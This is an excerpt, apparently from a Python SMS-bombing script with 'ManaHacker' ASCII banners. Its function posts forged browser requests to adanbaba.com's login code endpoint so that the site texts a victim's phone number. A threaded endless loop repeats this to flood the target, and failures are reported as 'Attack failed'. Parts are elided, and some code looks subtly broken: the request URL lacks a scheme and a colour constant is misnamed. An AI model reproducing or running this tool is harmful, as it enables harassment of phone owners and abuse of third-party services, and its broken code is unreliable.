...
\___ \ | '_ ` _ \ / __| | |__| | / _` | / __| | |/ /
 ___) || | | | | |\__ \ |  __| ||(_| | | (__  |  <  
|____/ |_| |_| |_| ___/ |_|  |_| \__,_| \___| |_|\_\ 
...
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 ...
 | |\/| |/ _` | '_ \ / _` | |  | |_| |/ _` |/ __| |/ / _ \ '__|  
 | |  | | (_| | | | | (_| | |  |  _  | (_| | (__|   <  __/ |     
 |_|  |_|\__,_|_| |_|\__,_|_|  |_| |_|\__,_|\___|_|\_\___|_|     
...
def adanbaba(phone):
    #adanbaba api
    adanbabaH = {"Host": "adanbaba.com","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://adanbaba.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://adanbaba.com/wap/login.html","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    adanbabaD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_type":"SMS"}}
    try:
        adanbabaR = requests.post("adanbaba.com", headers=adanbabaH, json=adanbabaD)
        if "OK" in adanbabaR.text:
            print (Fore.Green+"adanbaba Send")
        else:
            print ("Attack failed :(")
    except:
        print ("Attack failed :(")
...
try:
    ...
    while True:
        ...
        Thread(target=adanbaba, args=[phone]).start()
